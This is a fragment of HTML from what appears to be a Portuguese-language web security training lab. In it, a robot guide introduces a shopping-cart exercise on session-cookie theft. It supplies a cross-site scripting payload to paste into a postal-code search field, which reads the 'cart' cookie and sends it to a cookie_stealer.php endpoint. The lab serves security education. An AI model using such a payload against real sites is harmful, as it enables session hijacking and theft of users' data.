...
<div style="display: flex; width: 100%;">
    ...
    <div class ="container-robot" style="">
        <div class="robot-speech">
            ...
            Parabéns, agora vamos para a próxima atividade!
            </p>
        </div>
        ...
        <p>O próximo laboratório consiste em um sistema de carrinho de compras, nele você irá experimentar o processo de roubo de cookies 
            de sessão e simular como um atacante pode adquirir informações de um usuário que está utilizando a plataforma.</p>

        <p>Copie o código abaixo e cole-o na barra de busca de CEP na página a seguir.</p>

        <div id="codeBlock">
        <code>&lt;script&gt;window.location="./cookie_stealer.php?atividade=ref_cookie&cart=" + encodeURIComponent(document.cookie.split("; ").find(row => row.startsWith("cart="))?.split("=")[1]);&lt;/script&gt;
        </code>
